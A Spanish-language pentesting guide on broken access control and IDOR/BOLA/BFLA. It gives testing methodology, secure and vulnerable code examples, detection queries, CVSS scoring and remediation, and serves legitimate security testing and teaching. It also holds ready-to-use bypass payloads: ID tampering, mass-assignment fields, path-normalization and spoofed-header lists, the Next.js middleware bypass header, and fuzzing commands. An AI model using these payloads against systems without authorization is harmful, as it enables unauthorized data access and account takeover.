# Control de acceso roto e IDOR (Broken Access Control / IDOR / BOLA / BFLA)

| Clasificación | |
|---|---|
| CWE | CWE-639 — Authorization Bypass Through User-Controlled Key; CWE-862 — Missing Authorization; CWE-863 — Incorrect Authorization; CWE-425 — Direct Request (Forced Browsing); CWE-285 — Improper Authorization |
| OWASP Top 10:2025 | A01 — Broken Access Control |
| OWASP API Top 10:2023 | API1 — Broken Object Level Authorization (BOLA); API3 — Broken Object Property Level Authorization; API5 — Broken Function Level Authorization (BFLA) |
| WSTG | WSTG-ATHZ-02 (Bypassing Authorization Schema), WSTG-ATHZ-03 (Privilege Escalation), WSTG-ATHZ-04 (IDOR), WSTG-IDNT-01 (Role Definitions) |

**Contenido:** 1. Qué es · 2. Dónde buscar · 3. Detección segura (metodología de dos cuentas y matriz de autorización) · 4. Explotación por contexto (IDOR/BOLA, BFLA, escalada vertical, multi-tenant, forced browsing, verbos, normalización de rutas, cabeceras, GraphQL/gRPC/WebSocket, URLs prefirmadas) · 5. Evasión · 6. Escalada y encadenamiento · 7. Caja blanca · 8. Falsos positivos · 9. Evidencia · 10. Severidad · 11. Remediación · 12. Herramientas · 13. Referencias

---

## 1. Qué es y por qué ocurre

El **control de acceso** (autorización) decide *qué* puede hacer un usuario ya identificado. Falla cuando el servidor comprueba que hay sesión válida (autenticación) pero no comprueba que *esa* sesión tenga derecho sobre *ese* objeto o *esa* función.

- **IDOR** (*Insecure Direct Object Reference*, referencia directa insegura a objeto): la aplicación usa un identificador que controla el cliente (`id=1043`, un UUID, un nombre de fichero) para localizar un recurso y no verifica que pertenezca al usuario. En APIs se llama **BOLA** (*Broken Object Level Authorization*).
- **BOPLA** (*Broken Object Property Level Authorization*): el objeto es accesible, pero se exponen o se permiten modificar propiedades concretas que no deberían (por ejemplo `role`, `balance`, `email_verified`). Incluye la **asignación masiva** (*mass assignment*: el framework copia todos los campos del JSON al modelo).
- **BFLA** (*Broken Function Level Authorization*): un usuario normal puede invocar una **función** reservada a otro rol (`POST /api/admin/users`, `DELETE /api/users/{id}`).
- **Escalada horizontal**: acceder a datos de otro usuario con el mismo rol. **Escalada vertical**: obtener capacidades de un rol superior.
- **Aislamiento multi-tenant** (*tenant*: cliente u organización que comparte la misma plataforma): un usuario de la organización A lee o modifica datos de la organización B.
- **Forced browsing** (navegación forzada): pedir directamente URLs que la interfaz no enlaza (`/admin`, `/export/all.csv`) confiando en que "nadie las conoce".

Causas típicas: la comprobación se hace solo en el frontend (ocultar botones), se confía en un identificador del cliente en lugar del de la sesión, la autorización está en un *middleware* que solo protege ciertas rutas o ciertos verbos, el proxy inverso y la aplicación interpretan la ruta de forma distinta (normalización), versiones antiguas de la API sin parchear, o la consulta a base de datos filtra por `id` pero no por `owner_id`/`tenant_id`.

## 2. Dónde buscar (señales del reconocimiento)

- Identificadores en ruta, query, cuerpo, cabeceras, cookies y claims de JWT: `id, uid, user_id, account_id, accountId, org_id, tenant, team_id, project, doc, file, filename, invoice, order, number, ref, key, uuid, guid, slug, handle, email`.
- Cabeceras de contexto: `X-Tenant-ID`, `X-Org-Id`, `X-Account`, `X-User-Id`, `X-Customer-Id`, `X-Impersonate`, `X-Acting-As`.
- Identificadores codificados: Base64 (`MTIzNA==`), hex, Hashids (`jR`, `k5`), IDs globales de GraphQL/Relay (`VXNlcjoxMjM=` = `User:123`), MongoDB ObjectId (24 hex, contiene marca de tiempo), UUIDv1 (contiene marca de tiempo y MAC), ULID/KSUID (ordenables por tiempo).
- Funciones de alto valor: perfil, cambio de email/teléfono, facturas, pedidos, exportaciones (CSV/PDF), adjuntos, mensajes, invitaciones, gestión de miembros, claves API, webhooks, 2FA (`/users/{id}/totp`, `/backup-codes`), sesiones activas, pagos, tickets de soporte.
- Rutas administrativas filtradas en JS (`/api/admin/`, `/internal/`, `/manage/`, `/staff/`), en `robots.txt`, `sitemap.xml`, documentación OpenAPI/Swagger, colecciones Postman, apps móviles (descompilar APK/IPA) y versiones antiguas (`/v1/`, `/api/legacy/`, `/mobile/`).
- Respuestas que devuelven más IDs de los necesarios: listados, búsqueda/autocompletado, comentarios, notificaciones, `@menciones`, errores detallados, trazas de observabilidad (Jaeger/Zipkin `/api/traces`).
- Diferencias entre roles en la interfaz: botones ocultos con CSS o deshabilitados, rutas del router SPA (`/admin/*`) que se cargan en el bundle aunque el usuario no tenga rol.

## 3. Detección segura (primeras sondas, no destructivas)

### 3.1 Preparación: dos cuentas propias por rol

Usa siempre **cuentas del equipo auditor**: `A` (atacante) y `B` (víctima) del mismo rol; si hay multi-tenant, `A` en la organización 1 y `B` en la organización 2; y una cuenta de cada rol superior (`admin`, `manager`) para obtener las peticiones privilegiadas de referencia. Crea en `B` objetos reconocibles (`CORVUS-B-canary-001`) para que la prueba de acceso sea inequívoca. Nunca uses datos de usuarios reales como prueba si basta con los tuyos.

### 3.2 Matriz de autorización (estilo Autorize/AuthMatrix)

Construye una tabla petición × identidad y rellénala con el resultado esperado y el observado:

| Petición | Anónimo | A (user, org1) | B (user, org2) | Admin | Esperado |
|---|---|---|---|---|---|
| `GET /api/invoices/{idB}` | 401 | **200 ✗** | 200 | 200 | solo B y admin |
| `PATCH /api/users/{idB}` | 401 | 403 | 200 | 200 | solo B y admin |
| `POST /api/admin/users` | 401 | **201 ✗** | 403 | 201 | solo admin |

Procedimiento: navega con la cuenta privilegiada o con `B` capturando todo en el proxy; reenvía cada petición con la cookie o token de `A`, y después sin credenciales. Compara código, longitud y, sobre todo, **contenido** (que aparezca el canario de `B`).

### 3.3 Orden de las sondas (primero lectura)

1. Peticiones de **lectura** (`GET`, consultas GraphQL) cambiando solo el identificador.
2. Si la lectura falla, prueba la misma petición sin identificador y añadiéndolo (`GET /api/messages?user_id=<idB>`).
3. Escritura **solo sobre objetos de la cuenta B propia** y con cambios inocuos y reversibles (renombrar a `CORVUS-test`, luego restaurar).
4. ⚠️ Borrado, cambio de email/contraseña, transferencias o cualquier escritura sobre objetos que no sean del equipo auditor: **requiere confirmación explícita del cliente**.

```http
GET /api/v2/invoices/88412 HTTP/1.1
Host: app.target.tld
Authorization: Bearer <token_A>

# Respuesta vulnerable: 200 con "customer":"CORVUS-B-canary-001"
```

## 4. Explotación por contexto o tecnología

### 4.1 Manipulación del identificador (IDOR/BOLA)

```text
/api/users/1043/profile            → /api/users/1044/profile
/api/docs/MTA0Mw==                 → /api/docs/MTA0NA==            (Base64 de 1043 → 1044)
{"id":1043}                        → {"id":[1044]}  ·  {"id":{"id":1044}}  ·  {"id":"1044"}  ·  {"id":1044.0}
?id=1043                           → ?id=1043&id=1044  ·  ?id[]=1044  ·  ?id=1044%00
account_id=<UUID>                  → account_id=1044  (algunos backends aceptan ambos)
/api/users/me                      → /api/users/1044   ·  /api/users/me?user_id=1044
/api/orders/1043                   → /api/orders/1043.json  ·  /api/orders/1043/  ·  /api/orders/1043%20
/api/users/*  ·  /api/users/%2a    (comodines, raro pero barato)
```

- **Nombre de parámetro alternativo**: si la petición usa `album_id`, prueba `user_id`, `owner_id`, `account_id` descubiertos en otras peticiones o con Arjun/Param Miner.
- **JSON duplicado**: `{"user_id":"A","user_id":"B"}` (el validador lee el primero y el ORM el último, según el parser).
- **JSON Patch / Merge Patch**: `[{"op":"replace","path":"/owner_id","value":"<idA>"}]`.
- **Objetos anidados y arrays**: `{"items":[{"id":<idB_item>}]}`; en operaciones *bulk* (`/api/bulk`, `ids=1,2,3`) a menudo solo se valida el primero.
- **IDOR en adjuntos y exportaciones**: `/download?file=invoice_1044.pdf`, `/export?report_id=`, rutas de almacenamiento `/uploads/<org>/<user>/<file>`.
- **IDOR en el flujo de autenticación**: endpoints de 2FA o recuperación por ID (`/api/users/{id}/backup-codes`, `/disable-2fa`), sesiones (`/api/users/{id}/sessions`).

### 4.2 Recolección de UUID y referencias "no adivinables"

Un UUID aleatorio no es un control de acceso: solo dificulta la enumeración. Busca dónde se filtra:

- Respuestas de listados, búsqueda de usuarios, autocompletado, comentarios, menciones, perfiles públicos, invitaciones, URLs compartidas, correos de notificación, metadatos de ficheros, `og:image`, logs de analítica, errores ("user 6f1c… not found in org …").
- Endpoints que traducen identificadores: `GET /api/users/lookup?email=b@test.tld` → UUID.
- **UUIDv1**: contiene marca de tiempo de 60 bits y nodo; si conoces dos UUID generados alrededor del de la víctima puedes acotar el espacio (*sandwich attack*). Identifícalo por el dígito de versión: `xxxxxxxx-xxxx-1xxx-…`.
- **MongoDB ObjectId**: 4 bytes de tiempo + 5 bytes aleatorios por proceso + 3 bytes de contador incremental; los creados en ráfaga desde el mismo proceso son casi consecutivos.
- **Hashids / IDs ofuscados**: si el *salt* aparece en el JS del cliente, se pueden decodificar y generar.
- GraphQL/Relay: `node(id:"VXNlcjoxMDQ0")` con `base64("User:1044")`.

### 4.3 Escalada vertical y BFLA

```http
# Petición capturada con la cuenta admin, reenviada con token de A
POST /api/admin/users HTTP/1.1
Authorization: Bearer <token_A>
Content-Type: application/json

{"email":"corvus-probe@auditor.tld","role":"viewer"}
```

- Endpoints paralelos: `/api/users/me` frente a `/api/admins/me`, `/api/v1/user/settings` frente a `/api/v1/admin/settings`.
- **Asignación masiva de rol** (BOPLA): añadir `"role":"admin"`, `"is_admin":true`, `"isAdmin":1`, `"permissions":["*"]`, `"groups":[1]`, `"org_role":"owner"`, `"plan":"enterprise"`, `"email_verified":true` en registro, actualización de perfil o aceptación de invitación. Prueba variantes `camelCase`, `snake_case`, `PascalCase` y anidadas (`{"user":{"role":"admin"}}`, `user[role]=admin`).
- Parámetros de depuración o de suplantación: `?admin=true`, `?debug=1`, `X-Impersonate-User: <id>`, `X-Acting-As`.
- Cambio de rol de uno mismo vía la función de gestión de miembros: `PATCH /api/orgs/{org}/members/{idA} {"role":"owner"}`.

### 4.4 Aislamiento multi-tenant

- Cambia el tenant en todos los sitios donde viaje: subdominio (`org1.app.tld` → `org2.app.tld` con la sesión de `A`), ruta (`/orgs/{org}/…`), cabecera (`X-Tenant-ID`), claim del JWT (`org_id`, solo si la firma es falsificable, ver `vulns/jwt.md`), parámetro del cuerpo.
- Mezcla: tenant propio en la cabecera y objeto ajeno en la ruta (`X-Tenant-ID: org1` + `/projects/<proyecto_org2>`); muchos backends validan el tenant pero luego buscan el objeto solo por ID.
- Invitaciones: aceptar una invitación de org2 con un token de invitación ajeno, o reutilizar el ID de invitación; invitarse a uno mismo a otra organización (`POST /orgs/{org2}/invites`).
- Recursos compartidos entre tenants: cachés, colas, índices de búsqueda (Elasticsearch/Algolia con claves de búsqueda sin filtro por tenant), almacenamiento de objetos con prefijo por tenant, *vector stores* de aplicaciones LLM (ver `vulns/llm-ai.md`).

### 4.5 Forced browsing y rutas ocultas

```bash
# Tras confirmar manualmente rutas interesantes; con tu cookie de usuario normal
ffuf -u https://app.target.tld/FUZZ -w admin-paths.txt -H "Cookie: session=<A>" -mc 200,204,301,302,401,403 -fs <tam_404> -rate 20
```

Rutas habituales: `/admin`, `/administrator`, `/manage`, `/console`, `/actuator`, `/internal`, `/api/internal`, `/debug`, `/swagger-ui/`, `/graphql` con mutaciones administrativas, `/export`, `/backup`, `/reports/all`. Compara la respuesta sin sesión, con sesión de usuario y con sesión de admin.

### 4.6 Bypass por verbo HTTP y *method override*

```http
GET /api/users/1044 → 403        POST /api/users/1044 → 200 ?
DELETE /api/users/1044 (bloqueado en el proxy) → POST + X-HTTP-Method-Override: DELETE
HEAD /admin/export → 200 (algunos frameworks ejecutan el handler de GET para HEAD)
```

Variantes de *override*: cabeceras `X-HTTP-Method-Override`, `X-HTTP-Method`, `X-Method-Override`; parámetros `_method=PUT` (Rails, Laravel, Symfony con `http_method_override`), `?method=DELETE`. Verbos arbitrarios (`FOO /admin`) en servidores que aplican la restricción solo a una lista de métodos (patrón clásico de `<Limit GET POST>` en Apache o `<http-method>` en `web.xml` de Java).

### 4.7 Bypass por normalización de rutas

El proxy inverso o el filtro de seguridad decide con una versión de la ruta y la aplicación enruta con otra.

```text
/admin                 /ADMIN  /Admin  /aDmIn           (rutas insensibles a mayúsculas: ASP.NET, IIS, algunos routers)
/admin/                /admin//  //admin  /./admin  /admin/.
/admin;/               /admin;foo=bar  /;/admin  /..;/admin    (matrix params: Tomcat/Spring/Jetty)
/admin%2f  /%2fadmin   /admin%252f  %2e/admin  /%2e%2e/admin   (codificación simple y doble)
/admin.json  /admin.css  /admin%23  /admin%3f  /admin?          (extensión o fragmento)
/admin%20  /admin%09  /admin%00  /admin..;/                   (espacios, nulos)
/static/..%2fadmin  /public/..;/admin  /images/../admin        (traversal desde ruta permitida)
/api/v1/users/../admin/settings
```

- Tomcat elimina `;parametro` de cada segmento y normaliza `..;/`; un proxy Nginx que bloquea `^/manager` no ve `/foo/..;/manager`.
- Spring: históricamente `/admin.anything` coincidía con `/admin` (*suffix pattern match*) y la barra final (`/admin/`) también; en Spring 6 ambos están desactivados por defecto, conviene probarlo igualmente en aplicaciones antiguas.
- ASP.NET/IIS: insensible a mayúsculas, acepta `\` como separador, y el *cookieless session* antiguo `/(S(x))/admin`.
- Unicode: `/％61dmin` (formas de ancho completo normalizadas con NFKC), `/admın` (i sin punto) en sistemas que normalizan después de autorizar.

### 4.8 Bypass por cabeceras

```http
GET / HTTP/1.1
Host: app.target.tld
X-Original-URL: /admin/users          # Symfony (con trusted proxies), algunos IIS/URL Rewrite
X-Rewrite-URL: /admin/users

GET /admin HTTP/1.1
X-Forwarded-For: 127.0.0.1            # restricciones por IP de origen
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
X-Forwarded-Host: localhost
X-Custom-IP-Authorization: 127.0.0.1
```

- **Next.js middleware (CVE-2025-29927)**: versiones vulnerables permitían saltarse el *middleware* (donde muchas apps hacen la autorización) con la cabecera interna `x-middleware-subrequest`. Ejemplos según versión: `x-middleware-subrequest: middleware`, `x-middleware-subrequest: src/middleware` o la repetición `middleware:middleware:middleware:middleware:middleware`. Verifica antes la versión (corregido en 12.3.5, 13.5.9, 14.2.25 y 15.2.3).
- Cabeceras de identidad que inyecta un *gateway* de confianza (`X-User`, `X-Auth-User`, `X-Remote-User`, `X-Forwarded-User`, `X-Email`): si la petición llega directa al backend o el gateway no las limpia, se puede suplantar identidad.
- `Referer`: algunas apps autorizan pasos de un asistente comprobando que `Referer` contiene `/admin`.

### 4.9 GraphQL, gRPC, WebSocket y almacenamiento en la nube

- GraphQL: autorización por campo y por resolvedor anidado (`me { organization { members { email apiKeys } } }`), alias y *batching* para enumerar (`a1:user(id:1){email} a2:user(id:2){email}`), `node(id:)` genérico. Ver `vulns/graphql.md`.
- gRPC: los IDs viajan en Protobuf; con reflexión activa, `grpcurl -plaintext host:443 list` y reenviar con otros IDs. Ver `vulns/api-rest-grpc-websocket.md`.
- WebSocket/Socket.IO: unirse a salas ajenas (`42["join",{"room":"org2-dashboard"}]`), suscripciones con `user_id`, canales Pusher/Ably con autorización de canal privado débil.
- URLs prefirmadas (S3/GCS/Azure SAS): cambiar la `Key`/ruta invalida la firma, pero revisa que el endpoint que **genera** la URL autorice (`POST /files/presign {"key":"org2/…"}`), su caducidad y si el bucket es listable.

## 5. Evasión de filtros y WAF

- Combinar codificaciones de la sección 4.7 con el verbo alternativo y el *override*.
- Cambiar `Content-Type` (`application/json` ↔ `application/x-www-form-urlencoded` ↔ `application/xml` ↔ `multipart/form-data`): validadores distintos según el *binding*.
- Mover el ID entre ruta, query, cuerpo y cabecera; el WAF suele inspeccionar solo uno.
- Probar **versiones antiguas** (`/v1/` frente a `/v3/`), hosts alternativos (`api-staging`, `mobile-api`, `legacy`), y el mismo backend detrás de otro dominio o directamente por IP (*origin*), donde las reglas del WAF/CDN no aplican.
- Contrabando de peticiones (*request smuggling*) para hacer llegar al backend una ruta que el *front-end* bloquea: ver `vulns/request-smuggling.md`.
- Para la técnica general, ver `vulns/waf-bypass.md`.

## 6. Escalada y encadenamiento (demostrar impacto máximo sin causar daño)

- **Fuga de IDs + IDOR**: un endpoint de búsqueda que revela UUID convierte un IDOR "no explotable" en masivo. Demuéstralo con la cuenta `B` y cuantifica (sin descargar) cuántos registros serían alcanzables, por ejemplo mostrando que el ID es secuencial y el máximo observado.
- **IDOR de escritura + XSS almacenado**: modificar un campo que ve otro usuario (nombre de proyecto en un panel admin) con una carga inocua (`<img src=x onerror=alert(document.domain)>`) sobre un objeto de `B`. Ver `vulns/xss.md`.
- **IDOR → toma de cuenta**: cambiar el email o el teléfono de recuperación de otra cuenta, leer tokens de reseteo, desactivar 2FA, generar claves API. ⚠️ Solo contra la cuenta `B` del auditor; contra cuentas reales **requiere confirmación explícita del cliente**.
- **BFLA → administración**: crear un usuario de prueba con rol admin o invitar al auditor a otra organización, y revertirlo inmediatamente documentando ambos pasos.
- **Multi-tenant → compromiso de plataforma**: leer secretos de integración (webhooks, credenciales SMTP, tokens OAuth de terceros) de otra organización; prueba de lectura con la org2 del auditor.
- **Control de acceso + caché**: una respuesta privada cacheada por la CDN expone datos a todos. Ver `vulns/cache-poisoning-deception.md`.
- **Control de acceso + carrera**: comprobar el permiso y ejecutar la acción en momentos distintos (TOCTOU). Ver `vulns/race-condition.md`.

## 7. Caja blanca: fuentes, sumideros y patrones de código

**Fuentes**: parámetros de ruta, query, cuerpo, cabeceras (`X-Tenant-ID`), claims del token. **Sumideros**: consultas al ORM por clave primaria sin filtro de propietario (`findById`, `get`, `find`, `findOne`, `objects.get`), lectura de ficheros por nombre, y rutas sin decorador o anotación de autorización.

### Node.js / Express

```js
// Vulnerable: autentica pero no comprueba propietario
app.get('/api/invoices/:id', requireAuth, async (req, res) => {
  res.json(await Invoice.findById(req.params.id));
});
// Seguro: el propietario forma parte de la consulta
app.get('/api/invoices/:id', requireAuth, async (req, res) => {
  const inv = await Invoice.findOne({ _id: req.params.id, tenantId: req.user.tenantId, ownerId: req.user.id });
  if (!inv) return res.sendStatus(404);
  res.json(inv);
});
```

### Python / Django y DRF

```python
# Vulnerable
def invoice(request, pk):
    return JsonResponse(model_to_dict(Invoice.objects.get(pk=pk)))
# Seguro
@login_required
def invoice(request, pk):
    inv = get_object_or_404(Invoice, pk=pk, owner=request.user)
    ...
# DRF: el fallo típico es queryset global; restringir en get_queryset()
class InvoiceViewSet(viewsets.ModelViewSet):
    serializer_class = InvoiceSerializer
    permission_classes = [IsAuthenticated]
    def get_queryset(self):
        return Invoice.objects.filter(tenant=self.request.user.tenant)
# Asignación masiva: serializer con fields="__all__" o sin read_only_fields para 'role', 'owner'
```

### Java / Spring

```java
// Vulnerable
@GetMapping("/api/invoices/{id}")
public Invoice get(@PathVariable Long id) { return repo.findById(id).orElseThrow(); }
// Seguro
@GetMapping("/api/invoices/{id}")
@PreAuthorize("isAuthenticated()")
public Invoice get(@PathVariable Long id, @AuthenticationPrincipal User u) {
  return repo.findByIdAndTenantIdAndOwnerId(id, u.getTenantId(), u.getId())
             .orElseThrow(NotFoundException::new);
}
// Revisar SecurityFilterChain: requestMatchers("/admin/**") con patrones que no cubren "/admin" o métodos concretos
```

### PHP / Laravel, Ruby on Rails, ASP.NET Core, Go

```php
// Laravel vulnerable / seguro
$doc = Document::find($id);                                   // vulnerable
$doc = $request->user()->documents()->findOrFail($id);        // seguro (+ Policies con $this->authorize('view', $doc))
// Asignación masiva: $guarded = [] o $fillable que incluye 'role'
```
```ruby
# Rails vulnerable / seguro
@doc = Document.find(params[:id])
@doc = current_user.documents.find(params[:id])
# params.permit! o permit(:role) => asignación masiva
```
```csharp
// ASP.NET Core: [Authorize] sin política de recurso; usar IAuthorizationService.AuthorizeAsync(User, doc, "OwnerPolicy")
var doc = await db.Docs.FindAsync(id);                                          // vulnerable
var doc = await db.Docs.SingleOrDefaultAsync(d => d.Id == id && d.OwnerId == uid); // seguro
```
```go
// Go: row := db.QueryRow("SELECT ... FROM docs WHERE id=$1", id)                 // vulnerable
//     row := db.QueryRow("SELECT ... FROM docs WHERE id=$1 AND owner_id=$2", id, uid) // seguro
```

### Consultas para localizar candidatos

```bash
# Accesos por clave primaria con parámetro de la petición
rg -n --pcre2 '(findById|findByPk|findOne|objects\.get|\.find|FindAsync|First(OrDefault)?)\s*\(\s*(req\.(params|query|body)|params\[|request\.|\$request|id\b)' -g '!*test*'
# Rutas sin autorización explícita (Spring / ASP.NET / Express)
rg -n '@(Get|Post|Put|Delete|Patch|Request)Mapping' -A3 | rg -v 'PreAuthorize|Secured|RolesAllowed'
rg -n 'AllowAnonymous|permitAll\(\)|skip_before_action :authenticate|authentication_classes = \[\]'
# Cabeceras de tenant/identidad confiadas
rg -n -i 'x-(tenant|org|user|account)-id|x-forwarded-user|x-remote-user|x-original-url|x-rewrite-url'
# Asignación masiva
rg -n "fields\s*=\s*['\"]__all__|params\.permit!|\\\$guarded\s*=\s*\[\]|Object\.assign\(\w+,\s*req\.body|\.update\(req\.body\)"
```

```yaml
# semgrep: findById con dato de la petición sin filtro de propietario (Express + Mongoose)
rules:
- id: corvus-idor-findbyid-express
  languages: [javascript, typescript]
  severity: WARNING
  message: Acceso por ID controlado por el cliente sin filtro de propietario/tenant
  patterns:
    - pattern-either:
        - pattern: $M.findById($REQ.params.$X)
        - pattern: $M.findById($REQ.query.$X)
        - pattern: $M.findByPk($REQ.params.$X)
    - pattern-not-inside: |
        if (<... $DOC.ownerId ...>) { ... }
```

También es útil `semgrep --config p/owasp-top-ten` y las reglas de la comunidad para `mass-assignment` en Rails/Laravel/Django como primer filtro, siempre verificando a mano.

## 8. Falsos positivos frecuentes

- El objeto es **público por diseño** (perfil público, producto, post publicado); comprobar con el cliente qué datos son privados.
- La respuesta es 200 pero vacía, genérica o devuelve **tus propios datos** (el servidor ignora el ID y usa la sesión). Verifica el canario de `B`.
- El 200 viene de la **caché** de tu navegador o de una CDN con tu propia respuesta.
- Recursos compartidos legítimamente (equipo, carpeta compartida, rol de lectura en la organización).
- Un ID ajeno que devuelve 404 frente a 403: no es IDOR, aunque puede ser **enumeración de existencia** (hallazgo menor).
- Escritura que devuelve 200 pero no persiste: confirma releyendo el objeto con la cuenta `B`.
- Ruta admin que devuelve 200 con la *shell* de la SPA pero cuyas llamadas API devuelven 403: el control está en la API, no es un hallazgo (salvo fuga de información en el bundle).

## 9. Evidencia mínima para validarlo

1. Identidades usadas (`A`, `B`, rol, organización) y prueba de que el objeto pertenece a `B` (captura con la sesión de `B`).
2. Petición exacta con la sesión de `A` (o sin sesión) y respuesta con el canario o dato de `B`, con cabeceras completas y marca temporal.
3. Para escritura: estado antes, petición, estado después visto por `B`, y reversión.
4. Para bypass de ruta/cabecera: la petición normal bloqueada (403) y la variante que pasa (200), lado a lado.
5. Alcance: patrón del ID (secuencial, UUID filtrado en X), número estimado de objetos afectados, sin volcarlos.

## 10. Severidad orientativa (vectores CVSS 3.1 y 4.0 típicos según impacto demostrado)

| Escenario demostrado | CVSS 3.1 | CVSS 4.0 (vector) |
|---|---|---|
| Lectura de datos no sensibles de otro usuario | `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N` (4.3) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N` |
| Lectura de PII/datos sensibles de cualquier usuario | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` (6.5) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| Lectura y modificación de objetos ajenos | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` (8.1) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| Escalada a administrador / toma de cuenta ajena | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (8.8) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` (8.7) |
| Acceso sin autenticar a datos sensibles | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (7.5) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| Panel admin sin autenticar con control total | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (9.8) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` (9.3) |

Si el ID es un UUID que solo se obtiene encadenando otra fuga, sube `AC` a `H` (3.1) o `AT` a `P` (4.0) cuando no se demuestre la fuente. Calcula la puntuación 4.0 exacta en la calculadora oficial de FIRST. Ajusta al alza el riesgo de negocio en multi-tenant (afecta a todos los clientes de la plataforma).

## 11. Remediación (con ejemplo de código correcto)

- **Denegar por defecto** y autorizar en el servidor en cada petición, en la capa de datos: el filtro por propietario/tenant forma parte de la consulta, no de un `if` posterior.
- Obtener la identidad y el tenant **solo de la sesión o del token validado**, nunca de parámetros o cabeceras del cliente.
- Centralizar la autorización (políticas de Laravel, `@PreAuthorize` / `AuthorizationManager` en Spring, `IAuthorizationService` en .NET, OPA/Cedar/OpenFGA) y aplicar *Row-Level Security* en la base de datos cuando sea posible.
- Listas de campos editables explícitas (DTO/serializers con `read_only_fields`) contra la asignación masiva.
- Normalizar la ruta **una sola vez** y aplicar la autorización tras la normalización y en la propia aplicación, no solo en el proxy; no confiar en `X-Original-URL`, `X-Forwarded-*` ni cabeceras de identidad salvo desde proxies de confianza, y eliminarlas en el borde.
- Retirar versiones antiguas de la API o aplicarles los mismos controles; inventario de endpoints (API9).
- Tests automáticos de autorización por endpoint (matriz rol × acción) en CI.

```python
# PostgreSQL Row-Level Security como defensa en profundidad
# ALTER TABLE invoices ENABLE ROW LEVEL SECURITY;
# CREATE POLICY tenant_isolation ON invoices USING (tenant_id = current_setting('app.tenant_id')::uuid);
def get_invoice(conn, user, invoice_id):
    with conn.cursor() as cur:
        cur.execute("SELECT set_config('app.tenant_id', %s, true)", (str(user.tenant_id),))
        cur.execute("SELECT * FROM invoices WHERE id = %s AND owner_id = %s", (invoice_id, user.id))
        row = cur.fetchone()
    if row is None:
        raise NotFound()   # 404 tanto si no existe como si no es suyo
    return row
```

## 12. Herramientas (comando y cuándo usarla; automatización solo tras confirmación manual, nunca como primer barrido)

- **Burp Suite — Autorize**: tras confirmar a mano el modelo de roles, pega la cookie/token de `A` en Autorize, navega con `B` o admin y revisa la columna "Enforcement Status". Configura filtros de ámbito para no reenviar peticiones destructivas (excluye `DELETE` y rutas de logout).
- **Burp — AuthMatrix / Auth Analyzer**: matrices de roles con varios usuarios y verificación por regex del contenido; útil para retest y para el informe.
- **Burp Repeater / Intruder / Turbo Intruder**: variaciones de ID y de ruta; Intruder con payloads numéricos a ritmo bajo solo tras confirmar la vulnerabilidad con un ID de `B`.
- **Param Miner / Arjun**: descubrir parámetros ocultos (`user_id`, `admin`): `arjun -u https://app.target.tld/api/profile -m JSON --headers "Authorization: Bearer <A>"`.
- **ffuf / feroxbuster**: forced browsing de rutas admin con la sesión de usuario, a tasa limitada (`-rate 20`).
- **nomore403 / byp4xx / extensión 403 Bypasser**: generan variantes de normalización y cabeceras para un 403 concreto ya identificado: `nomore403 -u https://app.target.tld/admin`.
- **Kiterunner**: descubrimiento de rutas API a partir de especificaciones Swagger: `kr scan https://api.target.tld -w routes-large.kite -x 5`.
- **grpcurl, InQL (GraphQL), Postman/Bruno** para reenviar con otras identidades.
- **semgrep / ripgrep** en caja blanca (sección 7).

## 13. Referencias

- OWASP Top 10:2025 A01 Broken Access Control; OWASP API Security Top 10:2023 (API1, API3, API5).
- OWASP WSTG — 4.5 Authorization Testing (WSTG-ATHZ-02/03/04).
- OWASP Cheat Sheets: Authorization, Insecure Direct Object Reference Prevention, Multi-Tenant Security, Mass Assignment.
- PortSwigger Web Security Academy — Access control vulnerabilities and privilege escalation; "URL-based access control can be circumvented"; Orange Tsai, "Breaking Parser Logic" (normalización de rutas).
- PayloadsAllTheThings — Insecure Direct Object References; HackTricks — IDOR, 403 & 401 Bypasses.
- Vercel / Next.js advisory CVE-2025-29927 (bypass de middleware).
- MITRE CWE-639, CWE-862, CWE-863, CWE-425, CWE-915 (asignación masiva).
